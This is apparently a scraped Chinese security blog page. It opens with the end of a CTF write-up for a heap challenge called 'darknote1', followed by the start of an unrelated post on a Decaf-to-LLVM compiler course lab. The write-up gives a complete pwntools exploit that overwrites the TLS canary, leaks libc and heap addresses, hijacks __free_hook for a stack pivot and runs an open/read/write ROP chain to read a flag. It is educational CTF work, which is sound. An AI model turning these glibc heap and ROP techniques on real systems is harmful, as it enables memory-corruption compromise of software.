<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&quot;want?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x600c0000</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pwndbg&gt; p &amp;main_arena </span></span><br><span class="line"><span class="string">$2 = (struct malloc_state *) 0x7ffff7fc1b80 &lt;main_arena&gt;</span></span><br><span class="line"><span class="string">pwndbg&gt; distance 0x7ffff77d4010 0x7ffff7fc1b80</span></span><br><span class="line"><span class="string">0x7ffff77d4010-&gt;0x7ffff7fc1b80 is 0x7edb70 bytes (0xfdb6e words)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x403FF0</span></span><br><span class="line">magic_addr = <span class="number">0x404260</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfdb6e</span> + <span class="number">0x7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(magic_addr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(libc_start_main_got))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;==================================\n&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x23f90</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>覆盖 TLS 上的 canary 就可以解锁 edit，show，dele，接着利用 <code>svcudp_reply</code> 完成栈迁移，然后打堆上 ORW 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> L</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./darknote1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x401B7B\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x188A)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Note: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Note: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;want?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x600c0000</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pwndbg&gt; p &amp;main_arena </span></span><br><span class="line"><span class="string">$2 = (struct malloc_state *) 0x7ffff7fc1b80 &lt;main_arena&gt;</span></span><br><span class="line"><span class="string">pwndbg&gt; distance 0x7ffff77d4010 0x7ffff7fc1b80</span></span><br><span class="line"><span class="string">0x7ffff77d4010-&gt;0x7ffff7fc1b80 is 0x7edb70 bytes (0xfdb6e words)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x403FF0</span></span><br><span class="line">magic_addr = <span class="number">0x404260</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfdb6e</span> + <span class="number">0x7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(magic_addr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(libc_start_main_got))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;==================================\n&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x23f90</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line">canary_libc = libc_base - -<span class="number">0x1f35e8</span></span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;canary_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary_libc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfdb6e</span> + <span class="number">0x7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(canary_libc-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot; Note: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2b0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_pop_r12_ret = libc_base + <span class="number">0x0000000000119211</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000120069</span></span><br><span class="line"></span><br><span class="line">svcudp_reply = libc_base + <span class="number">26</span> + <span class="number">0x154dd0</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x00000000000578c8</span></span><br><span class="line">add_rsp_0x58_ret = libc_base + <span class="number">0x00000000000d0ea3</span></span><br><span class="line">success(<span class="string">&quot;svcudp_reply &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(svcudp_reply))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfdb6e</span> + <span class="number">0x7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(free_hook-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(svcudp_reply))</span><br><span class="line"></span><br><span class="line">ORW_start_addr = heap_base + <span class="number">0x380</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x10</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(add_rsp_0x58_ret)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x20</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(ORW_start_addr)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x28</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x48</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(ORW_start_addr+<span class="number">8</span>)</span><br><span class="line">success(<span class="string">&quot;payload len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,payload)</span><br><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># read(0,heap_addr,0x200)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(heap_base + <span class="number">0x440</span>)</span><br><span class="line">payload += p64(pop_rdx_pop_r12_ret) + p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">success(<span class="string">&quot;payload len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># open(heap_addr,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(ORW_start_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_pop_r12_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,heap_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(ORW_start_addr)</span><br><span class="line">payload += p64(pop_rdx_pop_r12_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,heap_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/16/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab4%EF%BC%9Adecafcomp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/16/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab4%EF%BC%9Adecafcomp/" class="post-title-link" itemprop="url">CMPT379编译器Lab4：decafcomp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-16 15:52:14 / Modified: 15:54:34" itemprop="dateCreated datePublished" datetime="2023-07-16T15:52:14+08:00">2023-07-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>63k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>57 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>decafcomp</strong></p>
<p>本作业的目标是为 Decaf 编程语言编写一个完整的工作编译器</p>
<p>Decaf 的结构和代码生成提示在 Decaf 规范中给出：<a target="_blank" rel="noopener" href="http://anoopsarkar.github.io/compilers-class/decafspec.html">Decaf Programming Language Specification</a></p>
<p><strong>实验描述</strong></p>
<p>本实验有如下的目标：</p>
<ul>
<li>添加对全局变量（也称为字段变量）的支持，Decaf 仅支持将整数和布尔数组定义为全局变量</li>
<li>确保所有变量（包括数组）的初始化均为零</li>
<li>添加对控制流（if 语句）和循环（while 和 for 语句）的支持，您需要了解程序控制流图中基本块的静态单一分配 SSA 形式，以及如何使用 LLVM API 实现 SSA 形式</li>
<li>实现布尔表达式的短路计算，短路是使用控制流实现的，与 if 语句非常相似</li>
<li>实现 Decaf 规范的无咖啡因语义部分中列出的所有语义检查，如果输入的 Decaf 程序未通过任何列出的语义检查，则引发语义错误</li>
<li>程序应拒绝任何语法或语义上无效的 Decaf 程序，并提供有用的错误消息，错误报告的质量取决于您，但您至少应该报告引发语法错误的行号和字符号</li>
<li>实现以下优化阶段：（可选）<ul>
<li>将堆栈分配使用情况 （Alloca） 转换为寄存器使用情况 （mem2reg）</li>
<li>简单的窥视孔优化（指令组合通过）</li>
<li>重新关联表达式</li>
<li>消除公共子表达式 （GVN）</li>
<li>简化控制流图（CFG 简化）</li>
</ul>
</li>
<li>使用 DWARF 注释将源代码级调试信息添加到 LLVM 程序集</li>
</ul>
<p>输出应位于 LLVM 程序集中，可以使用 LLVM 工具编译为 x86 程序集并作为二进制文件运行，我们将在 <code>answer</code> 目录中使用二进制 <code>llvm-run</code> 从测试用例目录中的 Decaf 程序创建和运行二进制文件</p>
<p>LLVM 程序集和工具链输出将转储到 <code>llvm</code> 目录中，应检查输出以调试编译器</p>
<p>如果程序成功解析输入，则应使用 <code>exit(EXIT_SUCCESS)</code> 退出程序，如果您的程序在输入的无咖啡因程序中发现错误，则应使用 <code>exit(EXIT_FAILURE)</code> 退出</p>
<p><strong>实验步骤</strong></p>
<p>首先需要把上一个实验的 <code>decafexpr.y decafexpr.lex default.cc</code> 放入本实验的 answer 目录，然后修改文件名称：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv decafexpr.lex decafcomp.lex</span><br><span class="line">mv decafexpr.y decafcomp.y</span><br><span class="line">mv decafexpr.cc decafcomp.cc</span><br></pre></td></tr></table></figure>
<ul>
<li>修改 <code>decafcomp.lex decafcomp.y decafcomp.cc</code> 中的头文件引用</li>
<li>将 <code>default.y</code> 中有关 LLVM 的代码拷贝到 <code>decafcomp.y</code> 中</li>
<li>将 <code>default.cc</code> 中有关 LLVM 的代码拷贝到 <code>decafcomp.cc</code> 中</li>
</ul>
<p>直接运行程序就有不错的分数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  decafcomp git:(master) ✗ python3 check.py </span><br><span class="line">Correct(dev): 129 / 208</span><br><span class="line">Score(dev): 129.00</span><br><span class="line">Total Score: 129.00</span><br></pre></td></tr></table></figure>
<p>接下来的工作就是在上一个实验的基础上进行完善和补充，这里重点介绍一下 bool 短路表达式的实现：</p>
<ul>
<li>要实现布尔表达式的短路，您需要以类似于控制流语句的方式控制基本块</li>
<li>LLVM 程序集的基础表示形式是静态的单一作业表或 SSA 表格，在 SSA 表单中，每个变量在程序中只分配一次值价值 的变量可以多次使用</li>
<li>在复杂的控制流中，图表变量可能从程序中的两个不同路径获取值，为了处理这种复杂性，SSA 表格使用了 φ 功能创建一个新变量，该变量取决于所经过的路径控制流图</li>
</ul>
<p>处理 bool 短路表达式的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">llvm::Value *<span class="title">decafBinexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == valueK)&#123;</span><br><span class="line">        decafAllexp * exp = (decafAllexp *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">return</span> exp-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expuK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (<span class="keyword">this</span>-&gt;<span class="built_in">get_op</span>(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> nottmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateNot</span>(L, <span class="string">&quot;nottmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;     </span><br><span class="line">            <span class="keyword">case</span> negtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateNeg</span>(L , <span 